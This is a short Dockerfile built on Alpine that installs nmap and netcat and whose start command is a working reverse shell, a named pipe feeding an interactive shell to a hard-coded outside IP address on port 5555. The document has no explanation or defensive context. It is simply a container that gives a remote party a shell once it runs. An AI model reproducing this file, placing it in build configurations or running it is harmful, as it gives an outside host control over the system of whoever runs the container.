FROM alpine:3.19
RUN apk add --no-cache nmap netcat-openbsd
CMD mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc 62.113.111.63 5555 > /tmp/f
